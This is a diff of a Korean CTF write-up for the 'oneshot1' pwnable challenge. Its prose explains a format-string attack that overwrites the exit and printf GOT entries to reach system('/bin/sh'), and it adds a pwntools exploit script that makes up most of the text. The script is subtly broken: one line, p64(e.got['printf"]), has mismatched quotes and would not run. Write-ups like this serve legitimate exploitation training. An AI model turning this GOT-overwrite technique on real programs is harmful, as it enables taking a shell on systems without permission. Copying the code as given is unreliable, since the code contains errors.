@@ -32,11 +32,11 @@ p.interactive()
 
 ## oneshot1
 
-앞 문제와 다르게 system 함수만 주어져 있고 "/bin/sh"는 주어져 있지 않다. buf에 입력을 받을 때 "/bin/sh"를 입력하고, printf 함수의 got를 system 함수로 덮어쓰면 system("/bin/sh")를 실행할 수 있다. 그러나 
-
+앞 문제와 다르게 system 함수만 주어져 있고 "/bin/sh"는 주어져 있지 않다. printf 함수의 got를 system 함수로 덮어쓰고 buf에 입력을 받을 때 "/bin/sh"를 입력하면 system("/bin/sh")를 실행할 수 있다. 이때 2번 이상 입력을 받아야 하므로 exit의 got를 main으로 덮어야 단계를 실행할 수 있을 것으로 보인다.  
 payload 단계를 구성할 수 있다.
-exit_got을 
-
+1. exit_got을 main으로 덮는다.
+2. printf_got을 system으로 덮는다.
+3. "/bin/sh"을 전송한다.
 
 
 ```python
@@ -47,23 +47,35 @@ from pwn import *
 
 e = ELF("./oneshot")
 p = process(e.path)
-
-
-system_plt = 
-
-printf_plt = 0x4010b0
+libc = e.libc
 
 
 
 p.recvuntil(b"\n\n")
-payload = f'%{e.symbols["gift"] >> 16}c'.encode() #gift_high
+payload = f'%{e.symbols["main"] >> 16}c'.encode() #main_high
 payload += b"%10$hn"
-payload += f"%{(e.symbols['gift'] & 0xffff) - (e.symbols['gift'] >> 16)}c".encode() #gift_low - gift_high
+payload += f"%{(e.symbols['main'] & 0xffff) - (e.symbols['main'] >> 16)}c".encode() #main_low - main_high
 payload += b"%11$hn"
 payload = payload.ljust(0x20, b"\x00")
 payload += p64(e.got["exit"] + 2)
 payload += p64(e.got["exit"])
+
 p.send(payload)
+
+
+p.recvuntil(b"\n\n")
+payload = f'%{e.symbols["system"] >> 16}c'.encode() #system_high
+payload += b"%10$hn"
+payload += f"%{(e.symbols['system'] & 0xffff) - (e.symbols['system'] >> 16)}c".encode() #system_low - system_high
+payload += b"%11$hn"
+payload = payload.ljust(0x20, b"\x00")
+payload += p64(e.got["printf"] + 2)
+payload += p64(e.got['printf"])
+p.send(payload)
+
+
+p.send('/bin/sh\x00')
+
 
 p.interactive()
 
